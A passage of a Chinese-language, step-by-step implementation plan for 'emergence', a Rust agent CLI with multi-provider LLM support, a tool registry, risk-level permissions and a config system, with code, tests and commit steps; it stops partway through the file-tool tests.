# emergence 实现计划

> **面向 agentic workers:** 必需子技能：使用 superpowers:subagent-driven-development（推荐）或 superpowers:executing-plans 来逐任务实现此计划。步骤使用 checkbox (`- [ ]`) 语法跟踪。

**目标:** 构建一个类 Claude Code 的 agent CLI 工具，支持多 provider LLM、8 个工具、分级权限、会话持久化和 ratatui TUI。

**架构:** 单 tokio 二进制文件，通过 trait 隔离模块。TUI 通过 mpsc channel 与 agent 循环通信（Action 进，Event 出）。LLM provider 实现统一的 Provider trait；工具实现统一的 Tool trait；两者由 registry 管理。

**技术栈:** Rust, Tokio, ratatui, crossterm, reqwest, serde/serde_json, async-trait, clap, serde_yaml

---

### 任务 1: 项目脚手架

**文件:**
- 创建: `Cargo.toml`
- 创建: `src/main.rs`
- 创建: `src/app.rs`
- 创建: `.gitignore`

- [ ] **步骤 1: 初始化 Cargo.toml**

```toml
[package]
name = "emergence"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1", features = ["full"] }
ratatui = "0.28"
crossterm = "0.28"
reqwest = { version = "0.12", features = ["stream", "json", "rustls-tls"], default-features = false }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
serde_yaml = "0.9"
async-trait = "0.1"
tokio-stream = "0.1"
clap = { version = "4", features = ["derive"] }
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter"] }
chrono = { version = "0.4", features = ["serde"] }
anyhow = "1"
thiserror = "2"
futures = "0.3"
regex = "1"

[dev-dependencies]
mockall = "0.12"
tempfile = "3"
tokio-test = "0.4"
pretty_assertions = "1"
```

- [ ] **步骤 2: 创建 .gitignore**

```
/target/
**/*.rs.bk
.emergence/
```

- [ ] **步骤 3: 创建最小 src/main.rs**

```rust
use clap::Parser;

#[derive(Parser)]
#[command(name = "emergence", version = "0.1.0")]
struct Cli {
    /// 要加载的会话 ID 或别名
    #[arg(short, long)]
    session: Option<String>,

    /// 使用的模型，如 "deepseek/deepseek-v4-pro"
    #[arg(short, long)]
    model: Option<String>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "emergence=info".into()),
        )
        .init();

    let cli = Cli::parse();
    tracing::info!("emergence v0.1.0 启动");

    emergence::app::App::new(cli.session, cli.model)?.run().await
}
```

- [ ] **步骤 4: 创建最小 src/app.rs**

```rust
pub struct App {
    session: Option<String>,
    model: Option<String>,
}

impl App {
    pub fn new(session: Option<String>, model: Option<String>) -> anyhow::Result<Self> {
        Ok(Self { session, model })
    }

    pub async fn run(&self) -> anyhow::Result<()> {
        tracing::info!("App::run() — 占位，将在任务 27 中实现");
        Ok(())
    }
}
```

- [ ] **步骤 5: 验证编译通过**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 6: 提交**

```bash
git add Cargo.toml src/main.rs src/app.rs .gitignore
git commit -m "feat: 项目脚手架 — Cargo.toml、main.rs、app.rs、.gitignore"
```

---

### 任务 2: LLM 消息类型

**文件:**
- 创建: `src/llm/message.rs`
- 创建: `src/llm/mod.rs`

- [ ] **步骤 1: 编写 message.rs 完整类型定义**

```rust
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Role {
    System,
    User,
    Assistant,
    Tool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChatMessage {
    pub role: Role,
    pub content: Content,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// OpenAI-compatible: tool 消息需要 tool_call_id
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_call_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum Content {
    Text(String),
    Parts(Vec<ContentPart>),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ContentPart {
    Text { text: String },
    ToolUse {
        id: String,
        name: String,
        input: serde_json::Value,
    },
    ToolResult {
        tool_use_id: String,
        content: String,
        #[serde(skip_serializing_if = "Option::is_none")]
        is_error: Option<bool>,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolDefinition {
    pub name: String,
    pub description: String,
    pub parameters: serde_json::Value,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StopReason {
    EndTurn,
    MaxTokens,
    ToolUse,
    StopSequence,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Usage {
    pub input_tokens: u32,
    pub output_tokens: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModelInfo {
    pub id: String,
    pub name: String,
    pub max_tokens: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GenerationConfig {
    pub max_tokens: u32,
    #[serde(default)]
    pub temperature: f64,
    #[serde(default = "default_top_p")]
    pub top_p: f64,
    #[serde(default)]
    pub stop_sequences: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub thinking: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tools: Option<Vec<ToolDefinition>>,
}

fn default_top_p() -> f64 { 1.0 }
```

- [ ] **步骤 2: 创建 src/llm/mod.rs，声明 message 模块**

```rust
pub mod message;

pub use message::{
    ChatMessage, Content, ContentPart, GenerationConfig,
    ModelInfo, Role, StopReason, ToolDefinition, Usage,
};
```

- [ ] **步骤 3: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 4: 提交**

```bash
git add src/llm/
git commit -m "feat: 定义 LLM 消息类型 — ChatMessage、Content、ToolDefinition、StopReason、Usage"
```

---

### 任务 3: Provider trait 与 StreamEvent

**文件:**
- 修改: `src/llm/mod.rs`

- [ ] **步骤 1: 在 src/llm/mod.rs 中添加 Provider trait 和 StreamEvent**

```rust
use async_trait::async_trait;
use futures::stream::Stream;
use std::pin::Pin;

pub mod message;

pub use message::{
    ChatMessage, Content, ContentPart, GenerationConfig,
    ModelInfo, Role, StopReason, ToolDefinition, Usage,
};

/// LLM 流式事件
#[derive(Debug, Clone)]
pub enum StreamEvent {
    TextDelta(String),
    ThinkingDelta(String),
    ToolCallDelta {
        id: String,
        name: String,
        arguments_json_fragment: String,
    },
    Finish {
        stop_reason: StopReason,
        usage: Usage,
    },
}

/// 聊天流：Pin<Box<dyn Stream>>
pub type ChatStream = Pin<Box<dyn Stream<Item = anyhow::Result<StreamEvent>> + Send>>;

/// LLM Provider trait — 所有 provider 实现此接口
#[async_trait]
pub trait Provider: Send + Sync {
    /// 发起聊天请求，返回 SSE 流
    async fn chat(
        &self,
        model: &str,
        messages: &[ChatMessage],
        tools: &[ToolDefinition],
        config: &GenerationConfig,
    ) -> anyhow::Result<ChatStream>;

    /// 返回该 provider 支持的模型列表
    fn models(&self) -> &[ModelInfo];
}
```

- [ ] **步骤 2: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 3: 提交**

```bash
git add src/llm/mod.rs
git commit -m "feat: 添加 Provider trait 与 StreamEvent 类型"
```

---

### 任务 4: ProviderRegistry

**文件:**
- 创建: `src/llm/registry.rs`
- 修改: `src/llm/mod.rs`

- [ ] **步骤 1: 编写 ProviderRegistry 实现**

创建 `src/llm/registry.rs`：

```rust
use super::{ChatStream, GenerationConfig, ModelInfo, Provider, ToolDefinition};
use crate::llm::ChatMessage;
use std::collections::HashMap;

pub struct ProviderRegistry {
    providers: HashMap<String, Box<dyn Provider>>,
}

impl ProviderRegistry {
    pub fn new() -> Self {
        Self {
            providers: HashMap::new(),
        }
    }

    pub fn register(&mut self, name: String, provider: Box<dyn Provider>) {
        self.providers.insert(name, provider);
    }

    pub fn get(&self, name: &str) -> Option<&dyn Provider> {
        self.providers.get(name).map(|p| p.as_ref())
    }

    pub fn list_providers(&self) -> Vec<String> {
        let mut names: Vec<String> = self.providers.keys().cloned().collect();
        names.sort();
        names
    }
}
```

- [ ] **步骤 2: 在 src/llm/mod.rs 末尾添加 module 声明**

```rust
pub mod registry;
pub use registry::ProviderRegistry;
```

- [ ] **步骤 3: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 4: 提交**

```bash
git add src/llm/
git commit -m "feat: 实现 ProviderRegistry — 注册、查找、列出 provider"
```

---

### 任务 5: OpenAI-compatible adapter

**文件:**
- 创建: `src/llm/openai.rs`
- 修改: `src/llm/mod.rs`

- [ ] **步骤 1: 编写 openai.rs 测试和实现**

```rust
use super::*;
use reqwest::Client;
use futures::StreamExt;
use tokio_stream::wrappers::ReceiverStream;

pub struct OpenAIAdapter {
    base_url: String,
    api_key: String,
    models: Vec<ModelInfo>,
    client: Client,
}

impl OpenAIAdapter {
    pub fn new(base_url: String, api_key: String, models: Vec<ModelInfo>) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
            api_key,
            models,
            client: Client::new(),
        }
    }

    /// 构建请求体 JSON（公开以便测试）
    pub fn build_chat_request(
        &self,
        model: &str,
        messages: &[ChatMessage],
        tools: &[ToolDefinition],
        config: &GenerationConfig,
    ) -> String {
        let mut body = serde_json::json!({
            "model": model,
            "messages": messages,
            "max_tokens": config.max_tokens,
            "temperature": config.temperature,
            "top_p": config.top_p,
            "stream": true,
        });

        if !tools.is_empty() {
            let openai_tools: Vec<serde_json::Value> = tools
                .iter()
                .map(|t| {
                    serde_json::json!({
                        "type": "function",
                        "function": {
                            "name": t.name,
                            "description": t.description,
                            "parameters": t.parameters,
                        }
                    })
                })
                .collect();
            body["tools"] = serde_json::json!(openai_tools);
        }

        if !config.stop_sequences.is_empty() {
            body["stop"] = serde_json::json!(config.stop_sequences);
        }

        if let Some(thinking_tokens) = config.thinking {
            body["thinking"] = serde_json::json!({
                "type": "enabled",
                "budget_tokens": thinking_tokens,
            });
        }

        body.to_string()
    }

    /// 解析 SSE 行，提取 StreamEvent
    fn parse_sse_line(line: &str) -> Option<anyhow::Result<StreamEvent>> {
        if !line.starts_with("data: ") {
            return None;
        }
        let data = &line[6..];
        if data == "[DONE]" {
            return Some(Ok(StreamEvent::Finish {
                stop_reason: StopReason::EndTurn,
                usage: Usage::default(),
            }));
        }

        let parsed: serde_json::Value = serde_json::from_str(data).ok()?;
        let choices = parsed["choices"].as_array()?;
        let choice = choices.first()?;
        let delta = &choice["delta"];

        // 优先检查 tool_calls
        if let Some(tool_calls) = delta["tool_calls"].as_array() {
            let tc = &tool_calls[0];
            let id = tc["id"].as_str().unwrap_or("").to_string();
            let func = &tc["function"];
            let name = func["name"].as_str().unwrap_or("").to_string();
            let args = func["arguments"].as_str().unwrap_or("").to_string();
            Some(Ok(StreamEvent::ToolCallDelta { id, name, arguments_json_fragment: args }))
        } else if let Some(content) = delta["content"].as_str() {
            if let Some(finish) = choice["finish_reason"].as_str() {
                let stop_reason = match finish {
                    "tool_calls" => StopReason::ToolUse,
                    "stop" => StopReason::EndTurn,
                    "length" => StopReason::MaxTokens,
                    _ => StopReason::EndTurn,
                };
                let usage = parsed.get("usage").map(|u| Usage {
                    input_tokens: u["prompt_tokens"].as_u64().unwrap_or(0) as u32,
                    output_tokens: u["completion_tokens"].as_u64().unwrap_or(0) as u32,
                }).unwrap_or_default();
                Some(Ok(StreamEvent::Finish { stop_reason, usage }))
            } else {
                Some(Ok(StreamEvent::TextDelta(content.to_string())))
            }
        } else if let Some(thinking) = delta["reasoning_content"].as_str() {
            Some(Ok(StreamEvent::ThinkingDelta(thinking.to_string())))
        } else if choice["finish_reason"].as_str().is_some() {
            Some(Ok(StreamEvent::Finish {
                stop_reason: StopReason::EndTurn,
                usage: Usage::default(),
            }))
        } else {
            None
        }
    }
}

#[async_trait]
impl Provider for OpenAIAdapter {
    async fn chat(
        &self,
        model: &str,
        messages: &[ChatMessage],
        tools: &[ToolDefinition],
        config: &GenerationConfig,
    ) -> anyhow::Result<ChatStream> {
        let body = self.build_chat_request(model, messages, tools, config);
        let url = format!("{}/chat/completions", self.base_url);

        let response = self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .header("Content-Type", "application/json")
            .body(body)
            .send()
            .await?;

        let status = response.status();
        if !status.is_success() {
            let error_text = response.text().await.unwrap_or_default();
            anyhow::bail!("LLM API error ({}): {}", status.as_u16(), error_text);
        }

        let (tx, rx) = tokio::sync::mpsc::channel::<anyhow::Result<StreamEvent>>(64);
        let byte_stream = response.bytes_stream();

        tokio::spawn(async move {
            let mut buffer = String::new();
            tokio::pin!(byte_stream);
            while let Some(chunk_result) = byte_stream.next().await {
                match chunk_result {
                    Ok(bytes) => {
                        buffer.push_str(&String::from_utf8_lossy(&bytes));
                        while let Some(newline_pos) = buffer.find('\n') {
                            let line = buffer[..newline_pos].trim_end().to_string();
                            buffer = buffer[newline_pos + 1..].to_string();
                            if !line.is_empty() {
                                if let Some(event) = Self::parse_sse_line(&line) {
                                    if tx.send(event).await.is_err() {
                                        return;
                                    }
                                }
                            }
                        }
                    }
                    Err(e) => {
                        let _ = tx.send(Err(anyhow::anyhow!("stream error: {}", e))).await;
                        return;
                    }
                }
            }
        });

        Ok(Box::pin(ReceiverStream::new(rx)))
    }

    fn models(&self) -> &[ModelInfo] {
        &self.models
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_adapter() -> OpenAIAdapter {
        OpenAIAdapter::new(
            "https://api.deepseek.com/v1".to_string(),
            "sk-test".to_string(),
            vec![ModelInfo {
                id: "deepseek-v4-pro".to_string(),
                name: "DeepSeek V4 Pro".to_string(),
                max_tokens: 128000,
            }],
        )
    }

    #[test]
    fn test_build_chat_request_basic() {
        let adapter = make_adapter();
        let messages = vec![ChatMessage {
            role: Role::User,
            content: Content::Text("hello".to_string()),
            name: None,
        }];
        let body = adapter.build_chat_request(
            "deepseek-v4-pro",
            &messages,
            &[],
            &GenerationConfig { max_tokens: 32000, temperature: 0.7, top_p: 1.0, stop_sequences: vec![], thinking: None, tools: None },
        );
        let parsed: serde_json::Value = serde_json::from_str(&body).unwrap();
        assert_eq!(parsed["model"], "deepseek-v4-pro");
        assert_eq!(parsed["max_tokens"], 32000);
        assert_eq!(parsed["messages"][0]["role"], "user");
        assert_eq!(parsed["messages"][0]["content"], "hello");
    }

    #[test]
    fn test_build_chat_request_with_tools() {
        let adapter = make_adapter();
        let tools = vec![ToolDefinition {
            name: "read".into(),
            description: "读取文件".into(),
            parameters: serde_json::json!({"type": "object", "properties": {}}),
        }];
        let body = adapter.build_chat_request(
            "m1", &[], &tools,
            &GenerationConfig { max_tokens: 100, temperature: 0.0, top_p: 1.0, stop_sequences: vec![], thinking: None, tools: None },
        );
        let parsed: serde_json::Value = serde_json::from_str(&body).unwrap();
        let tool_arr = parsed["tools"].as_array().unwrap();
        assert_eq!(tool_arr.len(), 1);
        assert_eq!(tool_arr[0]["function"]["name"], "read");
    }

    #[test]
    fn test_models() {
        let adapter = make_adapter();
        assert_eq!(adapter.models().len(), 1);
        assert_eq!(adapter.models()[0].id, "deepseek-v4-pro");
    }

    #[test]
    fn test_parse_sse_text_delta() {
        let event = OpenAIAdapter::parse_sse_line(
            r#"data: {"choices":[{"delta":{"content":"Hello"},"index":0}]}"#
        );
        match event {
            Some(Ok(StreamEvent::TextDelta(text))) => assert_eq!(text, "Hello"),
            other => panic!("expected TextDelta, got {:?}", other),
        }
    }

    #[test]
    fn test_parse_sse_finish() {
        let event = OpenAIAdapter::parse_sse_line(
            r#"data: {"choices":[{"finish_reason":"stop","delta":{},"index":0}],"usage":{"prompt_tokens":10,"completion_tokens":5}}"#
        );
        match event {
            Some(Ok(StreamEvent::Finish { stop_reason, usage })) => {
                assert_eq!(stop_reason, StopReason::EndTurn);
                assert_eq!(usage.input_tokens, 10);
                assert_eq!(usage.output_tokens, 5);
            }
            other => panic!("expected Finish, got {:?}", other),
        }
    }
}
```

- [ ] **步骤 2: 更新 src/llm/mod.rs 添加 openai 模块**

在 mod.rs 末尾添加：
```rust
pub mod openai;
```

- [ ] **步骤 3: 验证编译和测试**

运行: `cargo test -p emergence llm::openai`
预期: 所有测试通过

- [ ] **步骤 4: 提交**

```bash
git add src/llm/openai.rs src/llm/mod.rs
git commit -m "feat: 实现 OpenAI-compatible adapter — SSE 流式解析、chat 请求"
```

---

### 任务 6: 配置系统

**文件:**
- 创建: `src/config/settings.rs`
- 创建: `src/config/agents_md.rs`
- 创建: `src/config/mod.rs`
- 创建: `src/utils/env.rs`
- 创建: `src/utils/mod.rs`

- [ ] **步骤 1: 创建 src/utils/env.rs**

```rust
/// 展开环境变量占位符 ${VAR_NAME}
pub fn expand_env_vars(value: &str) -> String {
    let re = regex::Regex::new(r"\$\{(\w+)\}").unwrap();
    re.replace_all(value, |caps: &regex::Captures| {
        let var_name = &caps[1];
        std::env::var(var_name).unwrap_or_else(|_| caps[0].to_string())
    })
    .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_expand_env_var() {
        std::env::set_var("EMERGENCE_TEST_VAR", "expanded_value");
        let result = expand_env_vars("prefix_${EMERGENCE_TEST_VAR}_suffix");
        assert_eq!(result, "prefix_expanded_value_suffix");
        std::env::remove_var("EMERGENCE_TEST_VAR");
    }

    #[test]
    fn test_missing_env_var_keeps_placeholder() {
        let result = expand_env_vars("${NONEXISTENT_VAR_XYZ_12345}");
        assert_eq!(result, "${NONEXISTENT_VAR_XYZ_12345}");
    }
}
```

- [ ] **步骤 2: 创建 src/utils/mod.rs**

```rust
pub mod env;
```

- [ ] **步骤 3: 创建 src/config/settings.rs — 配置结构体**

```rust
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Settings {
    #[serde(default)]
    pub version: u32,
    #[serde(default = "default_model")]
    pub model: String,
    #[serde(default)]
    pub generation: GenerationSettings,
    #[serde(default)]
    pub providers: HashMap<String, ProviderConfig>,
    #[serde(default)]
    pub permissions: PermissionsSettings,
    #[serde(default)]
    pub tools: ToolsSettings,
    #[serde(default)]
    pub session: SessionSettings,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GenerationSettings {
    #[serde(default = "default_max_tokens")]
    pub max_tokens: u32,
    #[serde(default = "default_temperature")]
    pub temperature: f64,
    #[serde(default = "default_top_p")]
    pub top_p: f64,
    #[serde(default)]
    pub stop_sequences: Vec<String>,
    pub thinking: Option<u32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProviderConfig {
    pub api_key: String,
    pub base_url: String,
    #[serde(default)]
    pub default_model: Option<String>,
    #[serde(default)]
    pub extra_headers: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PermissionsSettings {
    #[serde(default = "default_auto_approve")]
    pub auto_approve: Vec<String>,
    #[serde(default)]
    pub deny_patterns: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ToolsSettings {
    #[serde(default)]
    pub disabled: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionSettings {
    #[serde(default = "default_store_dir")]
    pub store_dir: String,
    #[serde(default = "default_true")]
    pub auto_save: bool,
    #[serde(default = "default_compaction_threshold")]
    pub compaction_threshold_tokens: u32,
}

// 默认值函数
fn default_model() -> String { "deepseek/deepseek-v4-pro".to_string() }
fn default_max_tokens() -> u32 { 32000 }
fn default_temperature() -> f64 { 0.7 }
fn default_top_p() -> f64 { 1.0 }
fn default_auto_approve() -> Vec<String> { vec!["read".into(), "grep".into(), "glob".into()] }
fn default_store_dir() -> String { "~/.emergence/sessions".to_string() }
fn default_true() -> bool { true }
fn default_compaction_threshold() -> u32 { 80000 }

impl Default for Settings {
    fn default() -> Self {
        Self {
            version: 1,
            model: default_model(),
            generation: GenerationSettings::default(),
            providers: HashMap::new(),
            permissions: PermissionsSettings::default(),
            tools: ToolsSettings::default(),
            session: SessionSettings::default(),
        }
    }
}

impl Default for GenerationSettings {
    fn default() -> Self {
        Self {
            max_tokens: default_max_tokens(),
            temperature: default_temperature(),
            top_p: default_top_p(),
            stop_sequences: vec![],
            thinking: None,
        }
    }
}

impl Default for PermissionsSettings {
    fn default() -> Self {
        Self {
            auto_approve: default_auto_approve(),
            deny_patterns: vec![],
        }
    }
}

impl Default for SessionSettings {
    fn default() -> Self {
        Self {
            store_dir: default_store_dir(),
            auto_save: default_true(),
            compaction_threshold_tokens: default_compaction_threshold(),
        }
    }
}
```

- [ ] **步骤 4: 创建 src/config/agents_md.rs**

```rust
use std::path::Path;

/// 从项目目录加载 AGENTS.md
pub fn load_agents_md(project_dir: &Path) -> Option<String> {
    let path = project_dir.join(".emergence").join("AGENTS.md");
    if path.exists() {
        std::fs::read_to_string(&path).ok()
    } else {
        None
    }
}

/// 从用户目录加载 AGENTS.md
pub fn load_user_agents_md(home_dir: &Path) -> Option<String> {
    let path = home_dir.join(".emergence").join("AGENTS.md");
    if path.exists() {
        std::fs::read_to_string(&path).ok()
    } else {
        None
    }
}
```

- [ ] **步骤 5: 创建 src/config/mod.rs — ConfigManager**

```rust
use std::path::{Path, PathBuf};
use crate::utils::env;

pub mod settings;
pub mod agents_md;

pub use settings::Settings;

pub struct ConfigManager {
    pub settings: Settings,
    pub agents_md_content: Option<String>,
    home_dir: PathBuf,
    project_dir: PathBuf,
}

impl ConfigManager {
    pub fn load(
        home_dir: PathBuf,
        project_dir: PathBuf,
        cli_model: Option<String>,
    ) -> anyhow::Result<Self> {
        let user_settings = load_settings_file(&home_dir.join(".emergence").join("settings.json"))
            .unwrap_or_else(|_| Settings::default());

        let project_settings = load_settings_file(&project_dir.join(".emergence").join("settings.json"))
            .unwrap_or_else(|_| Settings::default());

        let mut settings = user_settings;
        merge_settings(&mut settings, &project_settings);

        if let Some(model) = cli_model {
            settings.model = model;
        }

        let agents_md = agents_md::load_agents_md(&project_dir)
            .or_else(|| agents_md::load_user_agents_md(&home_dir));

        Ok(Self {
            settings,
            agents_md_content: agents_md,
            home_dir,
            project_dir,
        })
    }

    /// /config reload — 重新加载配置
    pub fn reload(&mut self) -> anyhow::Result<()> {
        let new = Self::load(
            self.home_dir.clone(),
            self.project_dir.clone(),
            None,
        )?;
        self.settings = new.settings;
        self.agents_md_content = new.agents_md_content;
        Ok(())
    }

    /// 获取实际存储目录（展开 ~）
    pub fn session_store_dir(&self) -> PathBuf {
        expand_tilde(&self.settings.session.store_dir)
    }

    /// 生成 GenerationConfig
    pub fn generation_config(&self) -> crate::llm::GenerationConfig {
        let g = &self.settings.generation;
        crate::llm::GenerationConfig {
            max_tokens: g.max_tokens,
            temperature: g.temperature,
            top_p: g.top_p,
            stop_sequences: g.stop_sequences.clone(),
            thinking: g.thinking,
            tools: None,
        }
    }
}

fn load_settings_file(path: &Path) -> anyhow::Result<Settings> {
    if path.exists() {
        let raw = std::fs::read_to_string(path)?;
        let expanded = env::expand_env_vars(&raw);
        Ok(serde_json::from_str::<Settings>(&expanded)?)
    } else {
        Ok(Settings::default())
    }
}

fn expand_tilde(path: &str) -> PathBuf {
    if path.starts_with("~/") {
        if let Some(home) = dirs_functions::home_dir() {
            return home.join(&path[2..]);
        }
    }
    PathBuf::from(path)
}

mod dirs_functions {
    use std::path::PathBuf;

    pub fn home_dir() -> Option<PathBuf> {
        std::env::var("HOME")
            .or_else(|_| std::env::var("USERPROFILE"))
            .map(PathBuf::from)
            .ok()
    }
}

/// 合并配置：overlay 覆盖 base
fn merge_settings(base: &mut Settings, overlay: &Settings) {
    base.model.clone_from(&overlay.model);
    base.version = overlay.version;
    base.generation.max_tokens = overlay.generation.max_tokens;
    base.generation.temperature = overlay.generation.temperature;
    base.generation.top_p = overlay.generation.top_p;
    if !overlay.generation.stop_sequences.is_empty() {
        base.generation.stop_sequences.clone_from(&overlay.generation.stop_sequences);
    }
    if overlay.generation.thinking.is_some() {
        base.generation.thinking = overlay.generation.thinking;
    }
    for (name, cfg) in &overlay.providers {
        base.providers.entry(name.clone()).or_insert_with(|| cfg.clone());
    }
    for tool in &overlay.permissions.auto_approve {
        if !base.permissions.auto_approve.contains(tool) {
            base.permissions.auto_approve.push(tool.clone());
        }
    }
    for pattern in &overlay.permissions.deny_patterns {
        if !base.permissions.deny_patterns.contains(pattern) {
            base.permissions.deny_patterns.push(pattern.clone());
        }
    }
    for tool in &overlay.tools.disabled {
        if !base.tools.disabled.contains(tool) {
            base.tools.disabled.push(tool.clone());
        }
    }
}
```

- [ ] **步骤 6: 验证编译**

运行: `cargo build`
预期: 编译成功

- [ ] **步骤 7: 提交**

```bash
git add src/config/ src/utils/ Cargo.toml
git commit -m "feat: 实现配置系统 — ConfigManager、settings.json 解析、AGENTS.md 加载、env 展开"
```

---

### 任务 7: Tool trait 与 ToolRegistry

**文件:**
- 创建: `src/tools/mod.rs`
- 创建: `src/permissions/mod.rs` (最小占位)

- [ ] **步骤 1: 创建 src/permissions/mod.rs (占位)**

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    ReadOnly,
    Write,
    System,
}
```

- [ ] **步骤 2: 创建 src/tools/mod.rs — Tool trait 和 ToolRegistry**

```rust
use std::collections::HashMap;
use crate::permissions::RiskLevel;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ToolOutput {
    pub content: String,
    pub metadata: Option<serde_json::Value>,
}

#[async_trait::async_trait]
pub trait Tool: Send + Sync {
    fn name(&self) -> &str;
    fn description(&self) -> &str;
    fn parameters(&self) -> serde_json::Value;
    fn risk_level(&self, params: &serde_json::Value) -> RiskLevel;
    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput>;
}

pub struct ToolRegistry {
    tools: HashMap<String, Box<dyn Tool>>,
}

impl ToolRegistry {
    pub fn new() -> Self {
        Self { tools: HashMap::new() }
    }

    pub fn register<T: Tool + 'static>(&mut self, tool: T) {
        self.tools.insert(tool.name().to_string(), Box::new(tool));
    }

    pub fn get(&self, name: &str) -> Option<&dyn Tool> {
        self.tools.get(name).map(|t| t.as_ref())
    }

    pub fn definitions(&self) -> Vec<crate::llm::ToolDefinition> {
        self.tools.values().map(|t| crate::llm::ToolDefinition {
            name: t.name().to_string(),
            description: t.description().to_string(),
            parameters: t.parameters(),
        }).collect()
    }

    pub fn risk_level(&self, name: &str, params: &serde_json::Value) -> Option<RiskLevel> {
        self.tools.get(name).map(|t| t.risk_level(params))
    }

    pub async fn execute(&self, name: &str, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let tool = self.tools.get(name)
            .ok_or_else(|| anyhow::anyhow!("未知工具: {}", name))?;
        tool.execute(params).await
    }

    pub fn list(&self) -> Vec<&dyn Tool> {
        self.tools.values().map(|t| t.as_ref()).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::permissions::RiskLevel;

    struct TestTool;

    #[async_trait::async_trait]
    impl Tool for TestTool {
        fn name(&self) -> &str { "test" }
        fn description(&self) -> &str { "测试工具" }
        fn parameters(&self) -> serde_json::Value {
            serde_json::json!({"type": "object", "properties": {}})
        }
        fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::ReadOnly }
        async fn execute(&self, _params: serde_json::Value) -> anyhow::Result<ToolOutput> {
            Ok(ToolOutput { content: "ok".into(), metadata: None })
        }
    }

    #[test]
    fn test_register_and_get() {
        let mut registry = ToolRegistry::new();
        registry.register(TestTool);
        assert!(registry.get("test").is_some());
        assert!(registry.get("unknown").is_none());
        assert_eq!(registry.definitions().len(), 1);
    }

    #[test]
    fn test_risk_level() {
        let mut registry = ToolRegistry::new();
        registry.register(TestTool);
        assert_eq!(registry.risk_level("test", &serde_json::json!({})), Some(RiskLevel::ReadOnly));
    }

    #[tokio::test]
    async fn test_execute() {
        let mut registry = ToolRegistry::new();
        registry.register(TestTool);
        let output = registry.execute("test", serde_json::json!({})).await.unwrap();
        assert_eq!(output.content, "ok");
    }
}
```

- [ ] **步骤 3: 更新 src/main.rs (或 lib.rs) 添加模块声明**

在顶层添加 `src/lib.rs`：
```rust
pub mod app;
pub mod config;
pub mod llm;
pub mod permissions;
pub mod tools;
pub mod utils;
```

同时修改 `src/main.rs`，移除 `mod app;`，使用 `use emergence::app;`。

- [ ] **步骤 4: 验证编译和测试**

运行: `cargo test -p emergence tools`
预期: 测试通过

- [ ] **步骤 5: 提交**

```bash
git add src/tools/ src/permissions/ src/lib.rs src/main.rs
git commit -m "feat: 实现 Tool trait 与 ToolRegistry — Tool trait、ToolRegistry、RiskLevel"
```

---

### 任务 8: 文件工具 — read、write、edit

**文件:**
- 创建: `src/tools/file.rs`
- 修改: `src/tools/mod.rs`

- [ ] **步骤 1: 编写失败测试**

在 `src/tools/file.rs` 中编写测试：

```rust
use super::*;
use crate::permissions::RiskLevel;

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    // ---------- ReadTool ----------

    #[tokio::test]
    async fn test_read_file() {
        let mut f = NamedTempFile::new().unwrap();
        writeln!(f, "line1\nline2\nline3").unwrap();
        let tool = ReadTool;
        let params = serde_json::json!({"file_path": f.path()});
        let output = tool.execute(params).await.unwrap();
        assert!(output.content.contains("line1"));
    }

    #[tokio::test]
    async fn test_read_file_with_offset_limit() {
        let mut f = NamedTempFile::new().unwrap();
        writeln!(f, "line1\nline2\nline3\nline4").unwrap();
        let tool = ReadTool;
        let params = serde_json::json!({"file_path": f.path(), "offset": 1, "limit": 2});
        let output = tool.execute(params).await.unwrap();
        assert!(output.content.contains("line2"));
        assert!(output.content.contains("line3"));
        assert!(!output.content.contains("line4"));
    }

    #[test]
    fn test_read_risk_level() {
        let tool = ReadTool;
